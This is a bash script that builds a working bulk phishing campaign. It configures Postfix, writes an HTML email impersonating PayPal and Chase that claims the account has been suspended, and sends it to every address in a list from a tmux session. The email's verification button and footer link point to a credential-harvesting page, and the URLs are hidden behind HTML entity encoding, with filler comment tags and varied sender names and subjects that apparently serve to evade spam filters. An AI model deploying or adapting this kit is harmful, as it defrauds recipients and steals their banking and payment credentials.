#!/bin/bash

# Ensure the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

# === Predefined values for automated setup ===
myhostname="mail.admailsend.com"
sender_email="supportzed@admailsend.com"
sender_name="CHASE BANK ALERT"
email_subject="TEMPORARY ACCOUNT SUSPENSION !!!"
email_list="list.txt"  # Ensure this file exists or provide full path

# === Install required packages ===
echo "Updating package list and installing Postfix and tmux..."
apt-get update -y
apt-get install -y postfix tmux mailutils

# === Backup and create new Postfix configuration ===
echo "Backing up and replacing Postfix main.cf..."
cp /etc/postfix/main.cf /etc/postfix/main.cf.backup
rm /etc/postfix/main.cf

tee /etc/postfix/main.cf > /dev/null <<EOL
myhostname = $myhostname
inet_interfaces = loopback-only
relayhost = 
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous
smtp_tls_security_level = none
queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
EOL

echo "Restarting Postfix..."
service postfix restart

# === Create HTML email content ===
echo "Creating email.html..."
cat > email.html <<EOL
<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>Account Notification – Immediate Action Needed</title> <style> body { font-family: 'Helvetica Neue', sans-serif; background-color: #eef2f7; margin: 0; padding: 20px; color: #2e2e2e; } .container { max-width: 640px; margin: auto; background-color: #ffffff; border-radius: 10px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.06); overflow: hidden; } .header { background-color: #ffffff; text-align: center; padding: 30px 20px 10px; border-bottom: 1px solid #e0e0e0; } .header img { max-width: 140px; } .content { padding: 30px 25px; } .content h1 { font-size: 22px; color: #003366; margin-bottom: 16px; } .content p { font-size: 15px; line-height: 1.6; margin-bottom: 16px; } .content ul { padding-left: 20px; margin-bottom: 16px; } .content ul li { margin-bottom: 8px; } .button { display: inline-block; padding: 12px 28px; background-color: #1D48A3; color: #ffffff; text-decoration: none; font-weight: 600; border-radius: 6px; transition: background-color 0.3s ease; } .button:hover { background-color: #1b4a7a; } .alert { background-color: #fff8e1; padding: 15px 20px; border: 1px solid #ffe58f; border-radius: 6px; font-weight: 500; color: #8a6d3b; margin-top: 25px; } .footer { text-align: center; font-size: 13px; color: #888; padding: 25px 15px; } .footer a { color: #3366cc; text-decoration: none; } .footer a:hover { text-decoration: underline; } @media (max-width: 600px) { .content { padding: 20px 15px; } } </style></head><body> <!-- 414c44fa --><div class="container"> <!-- Header --> <!-- 414c44fa --><div class="header"> <img src="h&#116;tp&#115;&#58;/&#47;i&#107;.i&#109;age&#107;i&#116;&#46;io/&#121;le&#117;lt&#97;j4/IMG&#95;&#55;&#49;&#55;&#50;.pn&#103;?up&#100;a&#116;e&#100;&#65;t=17&#53;78&#56;92805&#49;&#55;" alt="Company Logo" /> <!-- 414c44fa --></div> <!-- Body --> <!-- 414c44fa --><div class="content"> <h1>Unusual Activity Detected on Your Account</h1> <p>Dear Customer,</p> <p> We’ve identified suspicious activity on your Paypal account on <strong>September 13, 2025</strong> at approximately <strong>2:21 AM</strong>. This activity differs from your usual behavior and has triggered a temporary security lock on your account. </p> <p><strong>Potential causes for this alert may include:</strong></p> <ul> <li>Attempted sign-in with incorrect credentials</li> <li>Login from an unfamiliar location or device</li> <li>Multiple failed access attempts</li> <li>Unusual or unauthorized transactions</li> </ul> <p> For your safety, access to your account has been temporarily limited. To restore full access and confirm your identity, please click the secure link below: </p> <p style="text-align: center;"> <a href="h&#116;tps:/&#47;bro&#110;co.we&#98;s&#105;te/u&#112;/pa&#108;/c&#97;&#112;tcha.p&#104;p" class="button">Verify and Secure Account</a> </p> <!-- 414c44fa --><div class="alert"> To prevent permanent restrictions, please complete the verification within 48 hours. <!-- 414c44fa --></div> <p>We appreciate your prompt attention to this matter.</p> <p>– Paypal</p> <!-- 414c44fa --></div> <!-- 414c44fa --></div> <!-- Footer --> <!-- 414c44fa --><div class="footer"> <p> Already verified your identity? <a href="ht&#116;&#112;&#115;:/&#47;bron&#99;&#111;&#46;&#119;e&#98;site/&#117;p/pal/captc&#104;&#97;&#46;&#112;&#104;p">Click here</a> to notify our security team. </p> <p>&copy; Paypal & Co. All rights reserved.</p> <!-- 414c44fa --></div></body></html>
EOL

# Make email.html writable (rw-rw-r--)
chmod 664 email.html
# Optional: Change ownership to a non-root user
# chown yourusername:yourusername email.html

# === Create the send script ===
echo "Creating send.sh..."
cat > send.sh <<EOL
#!/bin/bash

# Counter for generating unique usernames
counter=1

# Loop through each email in the list
while IFS= read -r email; do
  echo "Sending email to: $email"

  # Generate unique From email
  from_username="supportzed$counter"
  from_domain="admailsend.com"
  from_email="$from_username@$from_domain"
  from_name="J.P MORGAN CHASE"
  from_header="$from_name <$from_email>"

  # Generate random 3-digit number (e.g., 123)
  random_number=$(shuf -i 100-999 -n 1)

  # Construct the subject with random number
  subject="TEMPORARY ACCOUNT FORECLOSURE ALERT ($random_number)"

  # Send the email
  cat <<EOF | /usr/sbin/sendmail -t
To: $email
From: $from_header
Subject: $subject
MIME-Version: 1.0
Content-Type: text/html

$(cat email.html)
EOF

  # Increment counter for next unique From email
  ((counter++))

done < list.txt
EOL

# Make send.sh executable and writable (rwxrwxr-x)
chmod 775 send.sh
# Optional: Change ownership
# chown yourusername:yourusername send.sh

# === Run the send.sh script in a tmux session ===
echo "Starting tmux session for bulk email sending..."
tmux new-session -d -s mail_session "./send.sh"

echo "✅ Setup complete. Emails are being sent in a tmux session."
echo "To reattach: tmux attach -t mail_session"
